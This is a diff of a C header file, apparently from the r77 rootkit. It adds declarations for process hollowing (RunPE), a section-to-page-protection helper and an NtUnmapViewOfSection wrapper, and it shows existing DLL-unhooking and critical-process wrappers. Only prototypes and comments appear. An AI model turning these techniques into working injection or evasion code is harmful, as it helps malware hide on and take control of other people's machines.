@@ -251,15 +251,23 @@ HANDLE CreatePublicNamedPipe(LPCWSTR name);
 BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit);
 /// <summary>
 /// Creates a new process using the process hollowing technique.
-/// <para>The bitness of the current process, the created process and the payload must match.</para>
+/// <para>If the current process is a 32-bit process, only 32-bit processes can be created.</para>
 /// </summary>
-/// <param name="path">The target executable path. This can be any existing file with the same bitness as the current process and the payload.</param>
+/// <param name="path">The target executable path. This can be any existing file with the same bitness as the payload.</param>
 /// <param name="payload">The actual executable that is the payload of the new process, regardless of the path argument.</param>
 /// <returns>
 /// TRUE, if this function succeeds;
 /// otherwise, FALSE.
 /// </returns>
 BOOL RunPE(LPCWSTR path, LPBYTE payload);
+/// <summary>
+/// Converts an IMAGE_SECTION_HEADER.Characteristics flag to a memory page protection flag.
+/// </summary>
+/// <param name="characteristics">The characteristics of a section.</param>
+/// <returns>
+/// A DWORD value to be used with VirtualProtectEx.
+/// </returns>
+DWORD SectionCharacteristicsToProtection(DWORD characteristics);
 /// <summary>
 /// Gets the file offset of an exported function from an executable file.
 /// </summary>
@@ -286,6 +294,7 @@ VOID UnhookDll(LPCWSTR name);
 
 NTSTATUS NTAPI R77_NtQueryObject(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
 NTSTATUS NTAPI R77_NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
+NTSTATUS NTAPI R77_NtUnmapViewOfSection(HANDLE processHandle, LPVOID baseAddress);
 NTSTATUS NTAPI R77_RtlGetVersion(PRTL_OSVERSIONINFOW versionInformation);
 NTSTATUS NTAPI R77_RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue);
 NTSTATUS NTAPI R77_RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb);
